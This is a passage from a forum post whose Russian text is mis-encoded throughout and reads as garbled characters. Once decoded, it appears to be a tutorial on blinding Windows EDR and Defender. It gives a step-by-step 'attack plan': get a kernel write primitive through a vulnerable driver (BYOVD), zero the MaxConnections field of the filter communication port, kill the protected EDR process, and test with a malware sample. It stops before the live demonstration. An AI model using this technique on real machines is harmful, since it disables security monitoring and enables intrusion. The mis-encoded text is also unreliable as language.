</ul>–ü–æ—Å–∫–æ–ª—å–∫—É –º—ã —Å–æ—Å—Ä–µ–¥–æ—Ç–æ—á–µ–Ω—ã —Ç–æ–ª—å–∫–æ –Ω–∞ —á–∞—Å—Ç–∏ EDR, —Ä–∞–±–æ—Ç–∞—é—â–µ–π –≤ —è–¥—Ä–µ, –≤–æ—Ç –≤–∏–∑—É–∞–ª–∏–∑–∞—Ü–∏—è —Ç–æ–≥–æ, —á—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç, –∫–æ–≥–¥–∞ –≤—ã —É–¥–∞–ª—è–µ—Ç–µ –∫–æ–ª–±—ç–∫–∏ —è–¥—Ä–∞:<br />
<br />
–î–û –æ–±–Ω—É–ª–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ –∫–æ–ª–±—ç–∫–∞ EDR:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796807305.png"
		data-src="https://osint42.org/attachments/1746796807305-png.331/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796807305-png.331/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796807305.png"
			title="1746796807305.png"
			width="568" height="264" loading="lazy" />
	</div><br />
<br />
–ü–û–°–õ–ï –æ–±–Ω—É–ª–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ –∫–æ–ª–±—ç–∫–∞ EDR:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796814683.png"
		data-src="https://osint42.org/attachments/1746796814683-png.332/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796814683-png.332/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796814683.png"
			title="1746796814683.png"
			width="499" height="338" loading="lazy" />
	</div><br />
<br />
–ú—ã –Ω–µ –±—É–¥–µ–º —É–≥–ª—É–±–ª—è—Ç—å—Å—è –≤ –¥–µ—Ç–∞–ª–∏ –ø–æ —ç—Ç–æ–π —Ç–µ–º–µ, –æ–Ω–∞ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–∞ –≤ –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: –£–∫–ª–æ–Ω—è–µ–º—Å—è –æ—Ç –ø–æ–≤–µ–¥–µ–Ω—á–µ—Å–∫–æ–≥–æ –¥–µ—Ç–µ–∫—Ç–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞ –∏ EDR | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;<br />
<br />
–ù–æ –≤—ã –º–æ–∂–µ—Ç–µ –∑–∞–º–µ—Ç–∏—Ç—å –Ω–∞ —Ä–∏—Å—É–Ω–∫–µ –Ω–∏–∂–µ, —á—Ç–æ –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –≤—ã –æ–±–Ω—É–ª—è–µ—Ç–µ –∞–¥—Ä–µ—Å –∫–æ–ª–±—ç–∫–∞ EDR, —ç—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –±–æ–ª—å—à–µ –Ω–∏–∫–∞–∫–∏—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π (–Ω–µ—Ç &quot;—Ä–∞—Å—Å—ã–ª–∫–∏&quot;) –Ω–µ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –æ—Ç Windows –∫ EDR_Driver.sys. –í –∏—Ç–æ–≥–µ, –Ω–∏–∫–∞–∫–∏–µ –∂—É—Ä–Ω–∞–ª—ã —Å–æ–±—ã—Ç–∏–π –Ω–µ –±—É–¥—É—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ EDR_Process.exe (–∏ –Ω–∞ –∫–æ–Ω—Å–æ–ª—å –∞–Ω–∞–ª–∏—Ç–∏–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏) –±–æ–ª—å—à–µ!<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797240133.png"
		data-src="https://osint42.org/attachments/1746797240133-png.336/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797240133-png.336/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797240133.png"
			title="1746797240133.png"
			width="1024" height="606" loading="lazy" />
	</div><br />
<br />
<b>–û—Å–ª–µ–ø–ª–µ–Ω–∏–µ EDR —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ–≥–æ –ø–æ–¥—Ö–æ–¥–∞</b><br />
<br />
–í —Ö–æ–¥–µ –º–æ–∏—Ö –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–π –ø–æ —ç—Ç–æ–π —Ç–µ–º–µ —è –∑–∞–¥–∞–≤–∞–ª—Å—è –≤–æ–ø—Ä–æ—Å–æ–º, –∫–∞–∫ –∏–∑–±–µ–∂–∞—Ç—å –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è –º–µ–∂–¥—É EDR_process.exe –∏ EDR_driver.sys –±–µ–∑ –∫–∞–∫–∏—Ö-–ª–∏–±–æ –∏–∑–º–µ–Ω–µ–Ω–∏–π –∫–æ–ª–±—ç–∫–æ–≤? –ú–æ–∂–µ–º –ª–∏ –º—ã –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å –æ–±–º–µ–Ω &quot;—Å–æ–æ–±—â–µ–Ω–∏—è–º–∏&quot; –º–µ–∂–¥—É EDR_process.exe –∏ EDR_Driver.sys?<br />
<br />
–ú—ã –º–æ–≥–ª–∏ –±—ã –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç—å –¥—Ä—É–≥–æ–π –ø–æ–¥—Ö–æ–¥, –∏—Å–ø–æ–ª—å–∑—É—è —ç—Ç—É –≥—Ä–∞—Ñ–∏—á–µ—Å–∫—É—é –∏–ª–ª—é—Å—Ç—Ä–∞—Ü–∏—é:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797250650.png"
		data-src="https://osint42.org/attachments/1746797250650-png.337/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797250650-png.337/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797250650.png"
			title="1746797250650.png"
			width="1024" height="606" loading="lazy" />
	</div><br />
<br />
–ü–æ–∫–∞ —è –ø—ã—Ç–∞–ª—Å—è –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Windbg, –Ø—Ä–¥–µ–Ω –®–∞—Ñ–∏—Ä –Ω–∞–ø–∏—Å–∞–ª –∑–∞–º–µ—á–∞—Ç–µ–ª—å–Ω—ã–π –±–ª–æ–≥<a href="https://windows-internals.com/investigating-filter-communication-ports/" target="_blank" class="link link--external" rel="noopener"> –æ –ò—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–∏ –ü–æ—Ä—Ç–æ–≤ –ö–æ–º–º—É–Ω–∏–∫–∞—Ü–∏–æ–Ω–Ω—ã—Ö –§–∏–ª—å—Ç—Ä–æ–≤</a>, –∫–æ—Ç–æ—Ä—ã–π –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –ø–æ–º–æ–≥.<br />
<br />
–Ø –æ–±–Ω–∞—Ä—É–∂–∏–ª –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–∞–Ω–Ω—ã—Ö Windows, –∫–æ—Ç–æ—Ä—ã–µ –º–∞–Ω–∏–ø—É–ª–∏—Ä—É—é—Ç—Å—è –≤–æ –≤—Ä–µ–º—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–≤—è–∑–∏ –º–µ–∂–¥—É –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º –∏ –¥—Ä–∞–π–≤–µ—Ä–æ–º.<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–∞–Ω–Ω—ã—Ö —Å –Ω–∞–∑–≤–∞–Ω–∏–µ–º FLT_SERVER_PORT_OBJECT –ø—Ä–∏–≤–ª–µ–∫–ª–∞ –º–æ–µ –≤–Ω–∏–º–∞–Ω–∏–µ, –ø–æ—Ç–æ–º—É —á—Ç–æ, –ø–æ—Ö–æ–∂–µ, —Å–æ–¥–µ—Ä–∂–∞–ª–∞ –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–µ –ø–æ–ª—è, –ø–æ—Å–º–æ—Ç—Ä–∏—Ç–µ, —Å–æ–≥–ª–∞—Å–Ω—ã –ª–∏ –≤—ã:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797259754.png"
		data-src="https://osint42.org/attachments/1746797259754-png.338/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797259754-png.338/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797259754.png"
			title="1746797259754.png"
			width="719" height="432" loading="lazy" />
	</div><br />
<br />
–ö–æ–≥–¥–∞ —è —É–≤–∏–¥–µ–ª —ç—Ç–æ, –ø–µ—Ä–≤—ã–π –≤–æ–ø—Ä–æ—Å, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏—à–µ–ª –º–Ω–µ –≤ –≥–æ–ª–æ–≤—É, –±—ã–ª –æ —Ç–æ–º, —á—Ç–æ –º–æ–∂–µ—Ç –ø—Ä–æ–∏–∑–æ–π—Ç–∏, –µ—Å–ª–∏ –º—ã —É—Å—Ç–∞–Ω–æ–≤–∏–º MaxConnections —Ä–∞–≤–Ω—ã–º –Ω—É–ª—é?<br />
<br />
–≠—Ç–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–∞–Ω–Ω—ã—Ö –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º API –¥—Ä–∞–π–≤–µ—Ä–æ–≤ Windows –ø–æ–¥ –Ω–∞–∑–≤–∞–Ω–∏–µ–º FltCreateCommunicationPort:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS FLTAPI FltCreateCommunicationPort(
  [in]           PFLT_FILTER            Filter,
  [out]          PFLT_PORT              *ServerPort,
  [in]           POBJECT_ATTRIBUTES     ObjectAttributes,
  [in, optional] PVOID                  ServerPortCookie,
  [in]           PFLT_CONNECT_NOTIFY    ConnectNotifyCallback,
  [in]           PFLT_DISCONNECT_NOTIFY DisconnectNotifyCallback,
  [in, optional] PFLT_MESSAGE_NOTIFY    MessageNotifyCallback,
  [in]           LONG                   MaxConnections
);</code></pre>
	</div>
</div><br />
<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltcreatecommunicationport" target="_blank" class="link link--external" rel="noopener">Microsoft documentation</a> –≤–æ—Ç-—á—Ç–æ –≥–æ–≤–æ—Ä–∏—Ç:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797271132.png"
		data-src="https://osint42.org/attachments/1746797271132-png.339/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797271132-png.339/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797271132.png"
			title="1746797271132.png"
			width="1024" height="269" loading="lazy" />
	</div><br />
<br />
–ß—Ç–æ –º—ã –º–æ–∂–µ–º –≤—ã–≤–µ—Å—Ç–∏? –ï—Å–ª–∏ –Ω–∞–º —É–¥–∞—Å—Ç—Å—è —Å–±—Ä–æ—Å–∏—Ç—å MaxConnections –¥–æ –Ω—É–ª—è, —ç—Ç–æ —Ç–æ–ª—å–∫–æ –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç –≤–æ–∑–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏–µ –Ω–æ–≤—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π. –î–∞–≤–∞–π—Ç–µ –ø—Ä–∏—Å—Ç—É–ø–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –ø–ª–∞–Ω—É –∞—Ç–∞–∫–∏:<br />
<br />
–®–∞–≥ 1: —Å–±—Ä–æ—Å –∑–Ω–∞—á–µ–Ω–∏—è MaxConnections<br />
–®–∞–≥ 2: –∑–∞—Å—Ç–∞–≤–∏—Ç—å EDR_Process.exe –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å—Å—è (–≤–µ—Ä–æ—è—Ç–Ω–æ, –ø–æ—Ç—Ä–µ–±—É—é—Ç—Å—è –≤—ã—Å–æ–∫–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ NT SYSTEM)<br />
–®–∞–≥ 3: –Ω–∞–±–ª—é–¥–∞—Ç—å –∑–∞ –ø–æ–≤–µ–¥–µ–Ω–∏–µ–º EDR<br />
<br />
<b>–®–∞–≥ 1: —Å–±—Ä–æ—Å –∑–Ω–∞—á–µ–Ω–∏—è MaxConnections</b><br />
<br />
–ü–µ—Ä–≤–æ–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ–µ —É—Å–ª–æ–≤–∏–µ –¥–ª—è —ç—Ç–æ–≥–æ —à–∞–≥–∞ - –Ω–∞–ª–∏—á–∏–µ –ø—Ä–∏–º–∏—Ç–∏–≤–∞ —á—Ç–µ–Ω–∏—è/–∑–∞–ø–∏—Å–∏ –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∑–Ω–∞—á–µ–Ω–∏—è –≤ 0. –î–ª—è —ç—Ç–æ–≥–æ –º—ã –±—É–¥–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–µ—Ö–Ω–∏–∫—É BYOVD (Bring Your Own Vulnerable Driver - –ü—Ä–∏–Ω–µ—Å–∏ —Å–≤–æ–π —É—è–∑–≤–∏–º—ã–π –¥—Ä–∞–π–≤–µ—Ä) - –¢–µ—Ö–Ω–∏–∫–∞ –æ–ø–∏—Å–∞–Ω–∞ –∑–¥–µ—Å—å. –í –∫–∞—á–µ—Å—Ç–≤–µ –≤—Ç–æ—Ä–æ–≥–æ —É—Å–ª–æ–≤–∏—è –Ω–∞–º –Ω—É–∂–Ω–æ –Ω–∞–π—Ç–∏ –∞–¥—Ä–µ—Å –ø–æ–ª—è MaxConnections –≤ –ø–∞–º—è—Ç–∏ —è–¥—Ä–∞, –≤–µ—Ä–Ω–æ? –î–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º, –∫–∞–∫ –º—ã –º–æ–∂–µ–º –ø–æ–ª—É—á–∏—Ç—å —ç—Ç–æ—Ç –∞–¥—Ä–µ—Å!<br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ fltmgr!_FLT_SERVER_PORT_OBJECT, –æ –∫–æ—Ç–æ—Ä–æ–π –º—ã –≥–æ–≤–æ—Ä–∏–ª–∏ —Ä–∞–Ω–µ–µ, –º–æ–∂–µ—Ç –±—ã—Ç—å –¥–æ—Å—Ç–∏–≥–Ω—É—Ç–∞ —á–µ—Ä–µ–∑ —Å—Ç—Ä—É–∫—Ç—É—Ä—É fltmgr!_FLT_FILTER, –∫–æ—Ç–æ—Ä–∞—è, –≤ —Å–≤–æ—é –æ—á–µ—Ä–µ–¥—å, –º–æ–∂–µ—Ç –±—ã—Ç—å –¥–æ—Å—Ç–∏–≥–Ω—É—Ç–∞ —á–µ—Ä–µ–∑ —Å—Ç—Ä—É–∫—Ç—É—Ä—É fltmgr!_FLTP_FRAME, –∫–æ—Ç–æ—Ä–∞—è –º–æ–∂–µ—Ç –±—ã—Ç—å –¥–æ—Å—Ç–∏–≥–Ω—É—Ç–∞ —á–µ—Ä–µ–∑ —Å—Ç—Ä—É–∫—Ç—É—Ä—É FLTMGR!_GLOBALS, –∫ –∫–æ—Ç–æ—Ä–æ–π –º–æ–∂–Ω–æ –¥–æ–±—Ä–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ –¥—Ä–∞–π–≤–µ—Ä FltMgr.sys.<br />
<br />
–ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å —ç—Ç–æ–≥–æ –º–æ–¥—É–ª—è —è–¥—Ä–∞ –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –∏–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ —Ä–µ–∂–∏–º–∞, –∏—Å–ø–æ–ª—å–∑—É—è Windows API NtQuerySystemInformation.<br />
<br />
–ú—ã –º–æ–∂–µ–º –Ω–∞–π—Ç–∏ –∞–¥—Ä–µ—Å MaxConnections, –ø—Ä–æ—Ö–æ–¥—è —á–µ—Ä–µ–∑ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–∞–Ω–Ω—ã—Ö —è–¥—Ä–∞ Windows,<b><u> –Ω–∞—á–∏–Ω–∞—è –æ—Ç –¥—Ä–∞–π–≤–µ—Ä–∞ FltMgr.sys –¥–æ —ç—Ç–æ–≥–æ –ø–æ–ª—è!</u></b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797280601.png"
		data-src="https://osint42.org/attachments/1746797280601-png.340/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797280601-png.340/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797280601.png"
			title="1746797280601.png"
			width="1024" height="283" loading="lazy" />
	</div><br />
<br />
<b><u>–í–æ—Ç –∫–∞–∫ —ç—Ç–æ –≤—ã–≥–ª—è–¥–∏—Ç, –∫–æ–≥–¥–∞ –≤—ã —Ö–æ—Ç–∏—Ç–µ –≤–∑–≥–ª—è–Ω—É—Ç—å –Ω–∞ –¥–µ—Ç–∞–ª–∏, –∫–∞—Å–∞—é—â–∏–µ—Å—è –¥—Ä–∞–π–≤–µ—Ä–∞ —è–¥—Ä–∞ Windows Defender:</u></b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797287371.png"
		data-src="https://osint42.org/attachments/1746797287371-png.341/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797287371-png.341/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797287371.png"
			title="1746797287371.png"
			width="871" height="286" loading="lazy" />
	</div><br />
<br />
–ò–º–µ—è –∑–Ω–∞–Ω–∏—è –æ —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∏–∏ –ø–∞–º—è—Ç–∏ MaxConnections, –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–∏–º–∏—Ç–∏–≤ —á—Ç–µ–Ω–∏—è –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å —Ç–µ–∫—É—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, –∏ –∏—Å–ø–æ–ª—å–∑—É—è –ø—Ä–∏–º–∏—Ç–∏–≤ –∑–∞–ø–∏—Å–∏ –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞, –º—ã –º–æ–∂–µ–º —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ –≤ 0.<br />
<br />
<b><u>–®–∞–≥ 2: –∑–∞—Å—Ç–∞–≤–∏—Ç—å EDR –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å—Å—è</u></b><br />
<br />
–≠—Ç–∞ —Ñ–∞–∑–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å —Å–ª–æ–∂–Ω–æ–π, –ø–æ—Å–∫–æ–ª—å–∫—É EDR_Process.exe –¥–µ–ª–∞–µ—Ç –≤—Å–µ –≤–æ–∑–º–æ–∂–Ω–æ–µ, —á—Ç–æ–±—ã –∑–∞—â–∏—Ç–∏—Ç—å —Å–µ–±—è. –û–±—ã—á–Ω–æ —ç—Ç–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –∫–∞–∫ —Å–ª—É–∂–±–∞ –∏ –±—É–¥–µ—Ç –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—Ç—å—Å—è –ø–æ—Å–ª–µ –µ–µ —Å–±–æ—è, –Ω–æ —ç—Ç–æ –Ω–∞—Å –Ω–µ –±–µ—Å–ø–æ–∫–æ–∏—Ç, –ø–æ—Å–∫–æ–ª—å–∫—É –Ω–∏–∫–∞–∫–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –Ω–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–æ EDR_Driver.sys –±–ª–∞–≥–æ–¥–∞—Ä—è —à–∞–≥—É 1 ;-)<br />
<br />
–õ–∏—á–Ω–æ —è –¥–µ–ª–∞—é —ç—Ç—É –æ–ø–µ—Ä–∞—Ü–∏—é, –∏—Å–ø–æ–ª—å–∑—É—è —Å–≤–æ–π —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç (–Ω–µ–ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–π –∑–ª–æ–≤—Ä–µ–¥–Ω—ã–π –¥—Ä–∞–π–≤–µ—Ä), –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–∞–º —É–±–∏–≤–∞—Ç—å –ø—Ä–æ—Ü–µ—Å—Å, –¥–∞–∂–µ –µ—Å–ª–∏ –æ–Ω –∑–∞—â–∏—â–µ–Ω, –Ω–æ —Ç–∞–∫–∂–µ –≤–æ–∑–º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Process Hacker (–µ—Å–ª–∏ –æ–Ω –Ω–µ –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ) –∏–ª–∏, —á—Ç–æ –µ—â–µ –ª—É—á—à–µ, –ª—é–±—ã–µ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É–µ–º—ã–µ &quot;–¥—Ä–∞–π–≤–µ—Ä—ã —É–±–∏–π—Ü—ã –ø—Ä–æ—Ü–µ—Å—Å–æ–≤&quot;.<br />
<br />
–Ø –Ω–∞—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é –±–ª–æ–≥–ø–æ—Å—Ç –ê–ª–∏—Å—ã –ö–ª–∏–º–µ–Ω—Ç-–ü–æ–º–º–µ—Ä–µ (@AliceCliment)<a href="https://alice.climent-pommeret.red/posts/process-killer-driver/" target="_blank" class="link link--external" rel="noopener"> &quot;–ù–∞—Ö–æ–¥–∫–∞ –∏ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –¥—Ä–∞–π–≤–µ—Ä–æ–≤ —É–±–∏–π—Ü –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ —Å LOL –∑–∞ 3000$&quot;</a>, –∫–æ—Ç–æ—Ä—ã–π –æ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç —ç—Ç—É —Ç–µ–º—É!<br />
<br />
<b><u>–®–∞–≥ 3: –Ω–∞–±–ª—é–¥–µ–Ω–∏–µ –∑–∞ –ø–æ–≤–µ–¥–µ–Ω–∏–µ–º EDR</u></b><br />
<br />
–î–∞–≤–∞–π—Ç–µ —Å–æ–∑–¥–∞–¥–∏–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û (–∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ –¥–æ—Å—Ç—É–ø–µ–Ω –Ω–∞ <a href="https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber" target="_blank" class="link link--external" rel="noopener">ired.team</a>) —Å –∏–º–µ–Ω–µ–º iwanttobeflag.exe, –∫–æ—Ç–æ—Ä–æ–µ –±–ª–æ–∫–∏—Ä—É–µ—Ç—Å—è Windows Defender:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797297138.png"
		data-src="https://osint42.org/attachments/1746797297138-png.342/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797297138-png.342/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797297138.png"
			title="1746797297138.png"
			width="882" height="681" loading="lazy" />
	</div><br />
<br />
–ó–∞—Ç–µ–º –º—ã –º–æ–∂–µ–º –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é —Ä–µ–∞–∫—Ü–∏—é –Ω–∞ –Ω–∞—à–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û, –∫–æ–ø–∏—Ä—É—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—É—é –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –∏–∑ –æ–±—â–µ–π –ø–∞–ø–∫–∏ –Ω–∞ –ª–æ–∫–∞–ª—å–Ω—ã–π –¥–∏—Å–∫. –≠—Ç–æ –≤—ã–∑—ã–≤–∞–µ—Ç —Ç—Ä–µ–≤–æ–≥—É –∏ –±–ª–æ–∫–∏—Ä—É–µ—Ç—Å—è Windows Defender, –∫–∞–∫ –∏ –æ–∂–∏–¥–∞–ª–æ—Å—å: –æ—Ç–ª–∏—á–Ω–æ!<br />
copy z:\iwanttobeflag.exe c:\<br />
<br />
–¢–µ–ø–µ—Ä—å —É –Ω–∞—Å –µ—Å—Ç—å —á—Ç–æ-—Ç–æ, —á—Ç–æ –≤ –æ–±—â–µ–º —Å–ª—É—á–∞–µ –¥–æ–ª–∂–Ω–æ –≤—ã–∑–≤–∞—Ç—å —Ç—Ä–µ–≤–æ–≥—É, –∏ –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–æ, —á—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –∑–∞–≥–ª—É—à–∞–µ—Ç –ª–∏ –Ω–∞—à–∞ —Ç–µ—Ö–Ω–∏–∫–∞ EDR.<br />
<br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è –ø–ª–∞–Ω–∞</b><br />
<br />
–î–∞–≤–∞–π—Ç–µ –æ–±—ä–µ–¥–∏–Ω–∏–º –≤—Å–µ —ç—Ç–æ –≤ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∏ –ø—Ä–æ–≤–µ—Ä–∏–º, –º–æ–≥—É—Ç –ª–∏ –Ω–∞—à–∏ —à–∞–≥–∏ 1 –∏ 2 –Ω–∞—Ä—É—à–∏—Ç—å –æ–ø–æ–≤–µ—â–µ–Ω–∏–µ, –≤—ã–∑–≤–∞–Ω–Ω–æ–µ –Ω–∞ —à–∞–≥–µ 3.<br />
<br />
–í–æ—Ç –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç (EDRSnowblast):<a href="https://v1k1ngfr.github.io/edrsnowblast/" target="_blank" class="link link--external" rel="noopener">EDRSnowblast - blizzard on EDR drivers</a><br />
<br />
–î–∞–≤–∞–π—Ç–µ –ø—Ä–æ–π–¥–µ–º—Å—è –ø–æ —à–∞–≥–∞–º –Ω–∞ –∂–∏–≤–æ–π –º–∞—à–∏–Ω–µ –∏ –ø–æ—Å–º–æ—Ç—Ä–∏–º, —á—Ç–æ –ø—Ä–æ–∏–∑–æ–π–¥–µ—Ç!<br />
<br />
